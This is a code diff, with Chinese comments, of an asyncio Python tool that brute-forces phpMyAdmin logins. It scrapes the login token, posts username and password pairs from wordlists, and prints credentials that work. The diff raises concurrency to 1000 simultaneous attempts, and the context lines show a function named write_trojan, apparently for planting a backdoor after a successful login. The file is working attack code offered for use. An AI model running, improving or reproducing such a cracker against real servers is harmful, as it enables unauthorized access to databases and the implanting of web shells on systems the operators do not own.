@@ -7,10 +7,13 @@ import asyncio
 import time
 import multiprocessing
 
+# 使用IP域名时，需要设置cookie
 jar = aiohttp.CookieJar(unsafe=True)
 # 用户名密码队列
 username_list = multiprocessing.Manager().list()
 password_list = multiprocessing.Manager().list()
+# 并发限制
+semaphore = asyncio.Semaphore(1000)
 
 
 async def read_file(filename, queue):
@@ -53,52 +56,53 @@ async def handle_request(session, url, method, data=None, **kwargs):
 async def phpmyadmin_crack(host, username, password):
     """phpmyadmin密码爆破"""
     timeout = aiohttp.ClientTimeout(total=30)
-    async with aiohttp.TCPConnector(limit=20, force_close=True, enable_cleanup_closed=True, ssl=False) as tc:
-        async with aiohttp.ClientSession(connector=tc, timeout=timeout, cookie_jar=jar) as session:
-            url = host + "/phpmyadmin/index.php"
-            # 第一次请求获取token
-            first_code, first_response = await handle_request(session=session, url=url, method="GET")
-            if not first_response:
-                return False, False
-            if first_code == 200:
-                # 获取token
-                token_search = re.compile(r'token=(.*?)"\s?target')
-                token = token_search.search(first_response)
-
-                if not token:
+    async with semaphore:
+        async with aiohttp.TCPConnector(limit=20, force_close=True, enable_cleanup_closed=True, ssl=False) as tc:
+            async with aiohttp.ClientSession(connector=tc, timeout=timeout, cookie_jar=jar) as session:
+                url = host + "/phpmyadmin/index.php"
+                # 第一次请求获取token
+                first_code, first_response = await handle_request(session=session, url=url, method="GET")
+                if not first_response:
                     return False, False
-                else:
-                    token_value = token.group(1)
-                    login_url = host + "/phpmyadmin/index.php"
-                    # print("爆破账号:{user},爆破密码:{password}".format(user=username, password=password))
-                    # 第二次请求登录
-                    login_data = {
-                        "pma_username": username,
-                        "pma_password": password,
-                        "server": "1",
-                        "lang": "zh_CN",
-                        "token": token_value
-                    }
-                    second_code, second_response = await handle_request(session=session, url=login_url, method="POST",
-                                                                        data=login_data)
-                    if second_response is None:
-                        return False, False
-                    if second_code != 302:
+                if first_code == 200:
+                    # 获取token
+                    token_search = re.compile(r'token=(.*?)"\s?target')
+                    token = token_search.search(first_response)
+
+                    if not token:
                         return False, False
                     else:
-                        # 首页
-                        index_url = host + "/phpmyadmin/main.php?token={}".format(token_value)
-                        index_code, index_response = await handle_request(session=session, url=index_url, method="GET")
-                        if not index_response:
+                        token_value = token.group(1)
+                        login_url = host + "/phpmyadmin/index.php"
+                        # print("爆破账号:{user},爆破密码:{password}".format(user=username, password=password))
+                        # 第二次请求登录
+                        login_data = {
+                            "pma_username": username,
+                            "pma_password": password,
+                            "server": "1",
+                            "lang": "zh_CN",
+                            "token": token_value
+                        }
+                        second_code, second_response = await handle_request(session=session, url=login_url, method="POST",
+                                                                            data=login_data)
+                        if second_response is None:
                             return False, False
-                        if index_code == 200:
-                            if "常规设置" in index_response:
-                                print("登录成功:用户名为{u},密码为{p}".format(u=username, p=password))
-                                return True, token_value
+                        if second_code != 302:
+                            return False, False
+                        else:
+                            # 首页
+                            index_url = host + "/phpmyadmin/main.php?token={}".format(token_value)
+                            index_code, index_response = await handle_request(session=session, url=index_url, method="GET")
+                            if not index_response:
+                                return False, False
+                            if index_code == 200:
+                                if "常规设置" in index_response:
+                                    print("登录成功:用户名为{u},密码为{p}".format(u=username, p=password))
+                                    return True, token_value
+                                else:
+                                    return False, False
                             else:
                                 return False, False
-                        else:
-                            return False, False
 
 
 def write_trojan(token_value, host):
@@ -180,8 +184,9 @@ async def async_handle_user_pass():
 
 
 def handle_user_pass():
-    new_user_password_loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(new_user_password_loop)
+    # 多线程中协程Loop标记
+    # new_user_password_loop = asyncio.new_event_loop()
+    # asyncio.set_event_loop(new_user_password_loop)
     user_password_loop = asyncio.get_event_loop()
     user_password_loop.run_until_complete(async_handle_user_pass())
 
@@ -193,8 +198,9 @@ async def async_handle_login(host):
 
 
 def handle_login(host):
-    new_login_loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(new_login_loop)
+    # 多线程中协程Loop标记
+    # new_login_loop = asyncio.new_event_loop()
+    # asyncio.set_event_loop(new_login_loop)
     login_loop = asyncio.get_event_loop()
     login_loop.run_until_complete(async_handle_login(host))
 
